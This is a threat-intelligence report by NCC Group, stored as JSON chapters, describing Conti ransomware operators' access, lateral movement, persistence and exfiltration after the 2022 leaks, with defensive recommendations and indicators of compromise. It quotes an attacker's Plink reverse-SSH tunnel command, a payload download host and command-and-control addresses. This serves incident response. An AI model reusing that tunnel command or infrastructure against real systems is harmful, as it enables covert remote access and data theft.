[
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0x5365910c",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "text": ""
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0x8487f2a2",
            "title": "Executive Summary",
            "text": "In February 2022, a Twitter account which uses the handle ContiLeaks, started to publicly release information for the operations of the cybercrime group behind the Conti ransomware. The leaked data included private conversations between members along with source code of various panels and tools (e.g. Team9 backdoor panel [1]). Furthermore, even though the leaks appeared to have a focus on the people behind the Conti operations, the leaked data confirmed (at least to the public domain) that the Conti operators are part of the group, which operates under the TheTrick ecosystem. For the past few months, there was a common misconception that Conti was a different entity.\nDespite the public disclosure of their arsenal, it appears that Conti operators continue their business as usual by proceeding to compromise networks, exfiltrating data and finally deploying their ransomware. This post describes the methods and techniques we observed during recent incidents that took place after the Conti data leaks.\nOur findings can be summarised as below:\nMultiple different initial access vectors have been observed.\nThe operator(s) use service accounts of the victims Antivirus product in order to laterally move through the estate and deploy the ransomware.\nAfter getting access, the operator(s) attempted to remove the installed Antivirus product through the execution of batch scripts.\nTo achieve persistence in the compromised hosts, multiple techniques were observed;Service created for the execution of Cobalt Strike.Multiple legitimate remote access software, AnyDesk, Splashtop and Atera, were deployed. (Note: This has been reported in the past too by different vendors)Local admin account Crackenn created. (Note: This has been previously reported by Truesec as a Conti behaviour [2])\nService created for the execution of Cobalt Strike.\nMultiple legitimate remote access software, AnyDesk, Splashtop and Atera, were deployed. (Note: This has been reported in the past too by different vendors)Local admin account Crackenn created. (Note: This has been previously reported by Truesec as a Conti behaviour [2])\nLocal admin account Crackenn created. (Note: This has been previously reported by Truesec as a Conti behaviour [2])\nBefore starting the ransomware activity, the operators exfiltrated data from the network with the legitimate software Rclone [3].\nIt should be noted that the threat actor(s) might use different tools or techniques in some stages of the compromise."
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0x83dbbdf4",
            "title": "Initial Access",
            "text": "Multiple initial access vectors have been observed recently; phishing emails and the exploitation of Microsoft Exchange servers. The phishing email delivered to an employer proceeded to deploy Qakbot to the users Citrix session. The targeting of Microsoft Exchange saw ProxyShell and ProxyLogon vulnerabilities exploited. When this vector was observed, the compromise of the Exchange servers often took place two three months prior to the post exploitation phase. This behaviour suggests that the team responsible for gaining initial access compromised a large number of estates in a small timeframe.\nWith a number of engagements, it was not possible to ascertain the initial access due to dwell time and evidence retention. However, other initial access vectors utilised by the Conti operator(s) are:\nCredential brute-force\nUse of publicly available exploits. We have observed the following exploits being used:Fortigate VPNCVE-2018-13379CVE-2018-13374Log4ShellCVE-2021-44228\nFortigate VPNCVE-2018-13379CVE-2018-13374\nCVE-2018-13379\nCVE-2018-13374\nLog4ShellCVE-2021-44228\nCVE-2021-44228\nPhishing e-mail sent by a legitimate compromised account."
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0x5fd6dacb",
            "title": "Lateral Movement",
            "text": "In one incident, after gaining access to the first compromised host, we observed the threat actor carrying out the following actions:\nDownload AnyDesk from hxxps://37.221.113[.]100/anydesk.exe\nDeployment of the following batch files:1.bat, 2.bat, 111.batRansomware propagationRemovesophos.bat, uninstallSophos.batUninstalls Sophos Antivirus solutionAspx.batContains a command-line, which executes the dropped executable file ekern.exe.ekern.exe is a command line connection tool known as Plink [4]This file establishes a reverse SSH tunnel that allows direct RDP connection to the compromised host.ekern.exe -ssh -P 53 -l redacted-pw redacted -R REDACTED_IP:59000:127.0.0.1:3389\n1.bat, 2.bat, 111.batRansomware propagation\nRansomware propagation\nRemovesophos.bat, uninstallSophos.batUninstalls Sophos Antivirus solution\nUninstalls Sophos Antivirus solution\nAspx.batContains a command-line, which executes the dropped executable file ekern.exe.ekern.exe is a command line connection tool known as Plink [4]This file establishes a reverse SSH tunnel that allows direct RDP connection to the compromised host.ekern.exe -ssh -P 53 -l redacted-pw redacted -R REDACTED_IP:59000:127.0.0.1:3389\nContains a command-line, which executes the dropped executable file ekern.exe.\nekern.exe is a command line connection tool known as Plink [4]\nThis file establishes a reverse SSH tunnel that allows direct RDP connection to the compromised host.\nekern.exe -ssh -P 53 -l redacted-pw redacted -R REDACTED_IP:59000:127.0.0.1:3389\nAfter executing the above files, we observed the following utilities being used for reconnaissance and movement:\nRDP\nADFind\nBloodhound to identify the network topology.\nnetscan.exe for network shares discovery.\nCobalt Strike deployed allowing the threat actor to laterally move throughout the network.\nThe common techniques across the multiple Conti engagements are the use of RDP and Cobalt Strike."
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0x2abe9d37",
            "title": "Persistence",
            "text": "The threat actor leveraged Windows services to add persistence for the Cobalt Strike beacon. The primary persistence method was a Windows service, an example can be observed below:\nA service was installed in the system.\nService Name: REDACTED\nService File Name: cmd.exe /c C:\\ProgramData\\1.msi\nService Type: user mode service\nService Start Type: demand start\nService Account: LocalSystem\nIn addition, services were also installed to provide persistence for the Remote Access Tools deployed by the threat actor:\nAnyDesk\nSplashtop\nAtera\nAnother Conti engagement saw no methods of persistence. However, a temporary service was created to execute Cobalt Strike. It is hypothesized that the threat actor planned to achieve their objective quickly and therefore used services for execution rather than persistence.\nIn a separate engagement, where the initial access vector was phishing and lead to the deployment of Qakbot, the threat actor proceeded to create a local admin account named Crackenn for persistence on the host."
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0xe159a5c2",
            "title": "Privilege Escalation",
            "text": "Conti operator(s) managed to escalate their privileges by compromising and using different accounts that were found in the compromised host. The credentials compromised in multiple engagements was achieved by deploying tools such as Mimikatz.\nOne operator was also observed exploiting ZeroLogon to obtain credentials and move laterally."
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0xbcc9a238",
            "title": "Exfiltration and Encryption",
            "text": "Similar to many other threat actors, Conti operator(s) exfiltrate a large amount of data from the compromised network using the legitimate software Rclone. Rclone was configured to upload to either Mega cloud storage provider or to a threat actor controlled server. Soon after the data exfiltration, the threat actor(s) started the data encryption. In addition, we estimate that the average time between the lateral movement and encryption is five days.\nAs discussed earlier on, the average dwell time of a Conti compromise is heavily dependant on the initial access method. Those incidents that have involved ProxyShell and ProxyLogon, the time between initial access and lateral movement has been three six months. However once lateral movement is conducted, time to completing their objective is a matter of days."
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0xa28da60b",
            "title": "Recommendations",
            "text": "Monitor firewalls for traffic categorised as filesharing\nMonitor firewalls for anomalous spikes in data leaving the network\nPatch externally facing services immediately\nMonitor installed software for remote access tools\nRestrict RDP and SMB access between hosts\nImplement a Robust Password Policy [5]\nProvide regular security awareness training"
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0xfa8f3083",
            "title": "Indicators of Compromise",
            "text": "",
            "table": "0;1;2\nIndicator Value;Indicator Type;Description\n37.221.113[.]100/anydesk.exe;IP Address;Hosts AnyDesk\n103.253.208[.]79;IP Address;Cobalt Strike command-and-control server\nC:\\ProgramData\\1.msi;Filename;Cobalt Strike payload\nC:\\ProgramData\\1.dll;Filename;Cobalt Strike payload\n223.29.205[.]54;IP Address;AnyDesk IP address of the operator.\nC:\\Windows\\sv.exe;Filename;Rclone\nC:\\Windows\\svchost.conf;Filename;Rclone config\nE03AF25994222D4DC6EFD98AE65217A03A5B40EEDCFFAC45F098E2A6F68F3F41;SHA256;Sv.exe \u2013 Rclone\nC:\\Users\\Public\\Report_18.xls;Filename;Cobalt Strike payload\nC:\\Users\\Public\\x86_16.dll;Filename;Cobalt Strike payload\nCrackenn;Account;Local admin account created on patient zero\nC:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Abevi\\<random characters>.dll;Filename;Qakbot payload\nC:\\Users\\Public\\AdFind.exe;Filename;ADFind\n23.82.140[.]234;IP Address;Cobalt Strike command-and-control server\n23.81.246[.]179;IP Address;Cobalt Strike command-and-control server\nhijelurusa[.]com;Domain;Cobalt Strike command-and-control server\n"
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0xa0f98e5",
            "title": "References",
            "text": "https://www.bleepingcomputer.com/news/security/conti-ransomware-source-code-leaked-by-ukrainian-researcher/\nhttps://www.truesec.com/hub/blog/proxyshell-qbot-and-conti-ransomware-combined-in-a-series-of-cyber-attacks\nhttps://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/\nhttps://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html"
        }
    },
    {
        "report": {
            "id": "report_0x632a6c5",
            "date": "20220331",
            "title": "Conti-nuation: methods and techniques observed in operations post the leaks",
            "url": "https://research.nccgroup.com/2022/03/31/conti-nuation-methods-and-techniques-observed-in-operations-post-the-leaks"
        },
        "chapter": {
            "id": "chapter_0xc7d5b717",
            "title": "Like this:",
            "text": "Like Loading..."
        }
    }
]